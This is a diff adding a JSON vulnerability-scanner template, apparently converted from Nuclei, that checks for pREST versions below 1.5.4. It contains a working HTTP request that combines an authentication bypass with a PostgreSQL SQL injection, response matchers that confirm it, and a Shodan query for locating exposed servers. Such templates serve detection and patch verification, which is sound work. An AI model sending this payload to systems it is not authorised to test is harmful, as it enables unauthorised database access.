@@ -1,0 +1,150 @@
+{
+  "id": "prest-sqli-auth-bypass",
+  "name": "pREST \u003c 1.5.4 - SQL Injection Via Authentication Bypass",
+  "author": "mihail8531,iamnoooob,rootxharsh,pdresearch",
+  "severity": "CRITICAL",
+  "description": "An authentication bypass vulnerability was introduced by changing the JWT whitelist configuration to use a regex pattern, allowing unauthorized access to any path containing /auth and leading to SQL Injection.\n",
+  "references": [
+    "https://github.com/advisories/GHSA-wm25-j4gw-6vr3"
+  ],
+  "tags": [
+    "sqli",
+    "prest",
+    "auth-bypass",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "html:\"authorization token is empty\""
+  },
+  "variables": {
+    "database": [
+      "{{database}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /{{database}}/information_schema\".tables)s%20where%201\u003dversion()::int--/auth HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "pq: invalid input syntax for type integer: \\\"PostgreSQL "
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "WORD",
+          "part": "content_type",
+          "values": [
+            "application/json"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "prest-sqli-auth-bypass",
+    "info": {
+      "name": "pREST \u003c 1.5.4 - SQL Injection Via Authentication Bypass",
+      "author": "mihail8531,iamnoooob,rootxharsh,pdresearch",
+      "severity": "critical",
+      "description": "An authentication bypass vulnerability was introduced by changing the JWT whitelist configuration to use a regex pattern, allowing unauthorized access to any path containing /auth and leading to SQL Injection.\n",
+      "reference": [
+        "https://github.com/advisories/GHSA-wm25-j4gw-6vr3"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "html:\"authorization token is empty\""
+      },
+      "tags": "sqli,prest,auth-bypass,sqli"
+    },
+    "variables": {
+      "database": "{{database}}"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /{{database}}/information_schema\".tables)s%20where%201\u003dversion()::int--/auth HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "pq: invalid input syntax for type integer: \\\"PostgreSQL "
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "word",
+            "negative": false,
+            "part": "content_type",
+            "words": [
+              "application/json"
+            ],
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
